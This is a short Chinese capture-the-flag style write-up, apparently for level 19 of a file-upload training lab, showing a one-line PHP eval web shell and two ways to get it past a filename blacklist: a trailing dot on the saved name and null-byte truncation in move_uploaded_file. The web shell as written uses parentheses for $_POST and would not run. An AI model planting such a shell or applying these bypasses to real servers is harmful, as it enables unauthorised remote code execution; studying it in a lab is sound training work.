## 解题wp(By:独立团孙德胜Alan)
本pass主要考察代码审计能力

## 1.打开第十九关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

发现强制性改成了upload-19.jpg

## 3.分析代码

![](./img/3.png)

黑名单策略，文件名用户可控，取文件名通过$_POST来获取。

名单策略，文件名用户可控，文件命名shell.php.绕过

上传shell.php文件，保存名称改为upload-19.php.绕过黑名单

## 4.修改upload-19.php.即可绕过，也可以通过截断方式绕过

特别注意，如果使用upload-19.php.绕过，需要修改PHP环境为5.2.17

![](.\img\5.png)

或者保存名自动变为upload-19.jpg，改为upload-19.php(0x00).jpg,可以用move_uploaded_file函数的00截断漏洞绕过。

